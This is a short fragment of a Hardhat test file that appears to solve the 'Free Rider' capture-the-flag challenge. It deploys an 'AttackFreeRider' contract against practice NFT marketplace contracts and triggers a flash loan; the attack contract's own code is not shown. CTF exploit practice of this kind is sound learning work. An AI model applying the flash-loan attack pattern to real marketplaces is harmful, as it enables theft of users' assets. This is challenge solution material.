...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    const uniswapFactoryAttack = this.uniswapFactory.connect(attacker);
    const marketplaceAttack = this.marketplace.connect(attacker);
    const buyerContractAttack = this.buyerContract.connect(attacker);
    const nftAttack = this.nft.connect(attacker);
    const FreeRiderAttackFactory = await ethers.getContractFactory(
      "AttackFreeRider",
      attacker
    );
    const attackContract = await FreeRiderAttackFactory.deploy(
      WETHAttack.address,
      tokenAttack.address,
      uniswapFactoryAttack.address,
      marketplaceAttack.address,
      buyerContractAttack.address,
      nftAttack.address
    );
    await attackContract.flashLoan(WETHAttack.address, NFT_PRICE);
  });
